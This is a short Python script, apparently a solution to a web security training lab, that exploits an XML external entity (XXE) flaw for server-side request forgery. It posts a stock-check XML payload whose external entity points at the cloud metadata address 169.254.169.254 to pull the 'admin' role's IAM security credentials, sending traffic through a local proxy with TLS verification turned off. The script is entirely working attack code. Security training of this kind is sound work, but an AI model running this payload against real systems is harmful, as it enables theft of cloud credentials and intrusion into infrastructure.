# Lab: Exploiting XXE to perform SSRF attacks

import requests
import re
import sys
import argparse
import bs4
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def xxe_injection():
    url = target_url + "/product/stock"
    
    # Payload
    data = """<?xml version='1.0' encoding='utf-8' ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>
    """

    out = r.post(url, data=data, verify=False, proxies=proxies)
    if out.status_code == 400:
        print("[+] Exploited")
        print(out.content)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, required=True)
    args = parser.parse_args()

    target_url = args.host

    r = requests.Session()
    proxies = {
        'https':'http://127.0.0.1:8080',
        'http':'http://127.0.0.1:8080'
    }

    xxe_injection()

